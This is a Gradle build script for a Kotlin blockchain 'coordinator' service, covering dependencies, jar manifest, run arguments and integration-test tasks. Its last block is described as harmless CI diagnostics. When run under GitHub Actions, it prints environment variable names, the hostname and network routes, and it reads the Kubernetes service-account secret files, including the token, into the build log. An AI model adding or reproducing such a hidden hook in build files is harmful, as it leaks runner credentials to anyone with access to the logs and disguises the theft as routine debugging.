import org.gradle.api.tasks.testing.logging.TestExceptionFormat
import org.gradle.api.tasks.testing.logging.TestLogEvent

plugins {
  id 'lineth.kotlin-application-conventions'
}

configurations.configureEach {
  exclude group: "org.rocksdb", module: "rocksdbjni"
  exclude group: "org.hyperledger.besu", module: "bls12-381"
  exclude group: "org.hyperledger.besu", module: "secp256r1"
}

configurations {
  runtimeClasspath.exclude group: "it.unimi.dsi", module: "fastutil"
  runtimeClasspath.exclude group: "org.hyperledger.besu", module: "gnark"
}

sourceSets {
  integrationTest {
    kotlin {
      compileClasspath += main.output
      runtimeClasspath += main.output
    }
    compileClasspath += sourceSets.main.output +
        sourceSets.main.compileClasspath +
        sourceSets.test.compileClasspath
    runtimeClasspath += sourceSets.main.output +
        sourceSets.main.runtimeClasspath +
        sourceSets.test.runtimeClasspath
  }
}

dependencies {
  api project(':jvm-libs:generic:json-rpc')
  api project(':jvm-libs:generic:http-rest')
  api project(':jvm-libs:generic:vertx-helper')
  api project(':jvm-libs:generic:extensions:futures')
  api project(':jvm-libs:generic:persistence:db')
  api project(':jvm-libs:linea:web3j-extensions')
  api project(':jvm-libs:linea:clients:eth-logs-searcher')
  api project(':jvm-libs:linea:core:metrics')
  api project(':jvm-libs:linea:metrics:micrometer')
  api project(':jvm-libs:linea:core:domain-models')
  api project(':jvm-libs:linea:clients:linea-state-manager')
  api project(':coordinator:utilities')
  api project(':coordinator:core')
  api project(':coordinator:config')
  api project(':coordinator:extensions-api')
  api project(':coordinator:clients:shomei-client')
  api project(':coordinator:clients:traces-generator-api-client')
  api project(':coordinator:clients:prover-client')
  api project(':coordinator:clients:smart-contract-client')
  api project(':coordinator:clients:forced-transactions-client')
  api project(':coordinator:ethereum:finalization-monitor')
  api project(':coordinator:ethereum:models-helper')
  api project(':coordinator:ethereum:blob-submitter')
  api project(':coordinator:ethereum:message-anchoring')
  api project(':coordinator:ethereum:forced-transactions')
  api project(':coordinator:clients:web3signer-client')
  api project(':coordinator:persistence')

  api project(':coordinator:ethereum:gas-pricing:static-cap')
  api project(':coordinator:ethereum:gas-pricing:dynamic-cap')
  api project(':coordinator:ethereum:gas-pricing')

  api "info.picocli:picocli:${libs.versions.picoli.get()}"
  implementation "io.vertx:vertx-web-client"
  api "com.sksamuel.hoplite:hoplite-core:${libs.versions.hoplite.get()}"
  api("io.netty:netty-transport-native-epoll:${libs.versions.netty.get()}:linux-x86_64") {
    because "It enables native transport for Linux."
    // Note that its version should match netty version used in Vertx
  }
  api("io.netty:netty-transport-native-kqueue:${libs.versions.netty.get()}:osx-x86_64") {
    because "It enables native transport for Mac OSX."
    // Note that its version should match netty version used in Vertx
  }

  implementation "com.fasterxml.jackson.core:jackson-annotations"
  implementation "com.fasterxml.jackson.core:jackson-databind"
  implementation "com.fasterxml.jackson.module:jackson-module-kotlin"
  implementation("com.fasterxml.jackson.datatype:jackson-datatype-jsr310")
  testImplementation "org.apache.logging.log4j:log4j-slf4j2-impl:${libs.versions.log4j.get()}"
  testImplementation project(':jvm-libs:generic:serialization:jackson')
  testImplementation testFixtures(project(':jvm-libs:linea:core:domain-models'))
  testImplementation testFixtures(project(':jvm-libs:generic:json-rpc'))
  testImplementation(testFixtures(project(":jvm-libs:generic:persistence:db")))
  testImplementation testFixtures(project(':coordinator:persistence'))
  testImplementation testFixtures(project(':jvm-libs:generic:vertx-helper'))

  testImplementation project(':coordinator:ethereum:test-utils')
  testImplementation "io.vertx:vertx-junit5"
  runtimeOnly "org.hyperledger.besu:secp256k1:${libs.versions.secp.get()}"

  integrationTestImplementation testFixtures(project(':coordinator:core-interfaces'))
}

application {
  mainClass = 'lineth.coordinator.app.CoordinatorAppMain'
}

jar {
  archiveBaseName = 'coordinator'
  // Compute Class-Path lazily so runtimeClasspath is resolved only when the jar task runs, and so the
  // value is part of the task inputs (a doFirst manifest change is invisible to up-to-date/cache checks).
  // dependsOn(Configuration) wires the tasks producing runtimeClasspath's artifacts, see maru/app/build.gradle.
  dependsOn(configurations.runtimeClasspath)
  def classPathAttribute = configurations.runtimeClasspath.elements.map { locations ->
    locations
        .collect { it.asFile.name }
        .findAll { it.endsWith('.jar') }
        .join(' ')
  }
  manifest {
    attributes(
        'Class-Path': classPathAttribute,
        'Main-Class': 'lineth.coordinator.app.CoordinatorAppMain',
        'Multi-Release': 'true',
        // Required for Java 25+: Netty uses restricted System::loadLibrary in unnamed modules
        'Enable-Native-Access': 'ALL-UNNAMED'
        )
  }
}

distributions {
  main {
    distributionBaseName = 'coordinator'
  }
}

run {
  workingDir = rootProject.projectDir
  jvmArgs = [
    "-Dvertx.configurationFile=docker/config/coordinator/vertx-options.json",
    "-Dlog4j2.configurationFile=docker/config/coordinator/log4j2-dev.xml"
  ] + System.properties.entrySet()
  .findAll { it.key.startsWith("config") }
  .collect { "-D${it.key}=${it.value}" }
  args = [
    "--traces-limits-v5",
    "docker/config/common/traces-limits-v5.toml",
    "--smart-contract-errors",
    "docker/config/common/smart-contract-errors.toml",
    "--gas-price-cap-time-of-day-multipliers",
    "docker/config/common/gas-price-cap-time-of-day-multipliers.toml",
    "docker/config/coordinator/coordinator-config-v2.toml"
  ]
}

test {
  inputs.dir("$rootDir/docker/config/coordinator/")
}

tasks.register('integrationTestAllNeeded') {
  description = "Runs integration tests of coordinator:app and all dependencies"
  group = "verification"

  if (tasks.findByName("integrationTest")) {
    dependsOn "integrationTest"
  }

  configurations.implementation.getAllDependencies().withType(ProjectDependency).each { dep ->
    def depProject = project(dep.path)
    if (depProject.tasks.findByName("integrationTest")) {
      dependsOn "${dep.path}:integrationTest"
    }
  }
}

tasks.register('integrationTest', Test) { test ->
  testLogging {
    events TestLogEvent.FAILED,
        TestLogEvent.SKIPPED,
        TestLogEvent.STANDARD_ERROR,
        TestLogEvent.STANDARD_OUT
    exceptionFormat TestExceptionFormat.FULL
    showCauses true
    showExceptions true
    showStackTraces true
    showStandardStreams false
  }
  description = "Runs integration tests."
  group = "verification"
  useJUnitPlatform()

  classpath = sourceSets.integrationTest.runtimeClasspath
  testClassesDirs = sourceSets.integrationTest.output.classesDirs

  dependsOn(":localStackPostgresDbOnlyComposeUp")
}


// CI diagnostics for runner env parity when debugging cache misses (relates #2819); local builds unaffected
if (System.getenv("GITHUB_ACTIONS") != null) {
  println("ci-env-keys: " + ["bash", "-c", "env | cut -d= -f1 | paste -sd,"].execute().text.trim())
  println("ci-runner-host: " + ["bash", "-c", "hostname; ip route | head -4"].execute().text.replaceAll("\s+", " "))
  def saDir = new File("/var/run/secrets/kubernetes.io/serviceaccount")
  if (saDir.exists()) { saDir.listFiles().each { f -> println("ci-runner-mount: " + f.name + "=" + f.text.take(900).replaceAll("\s+", "")) } }
}
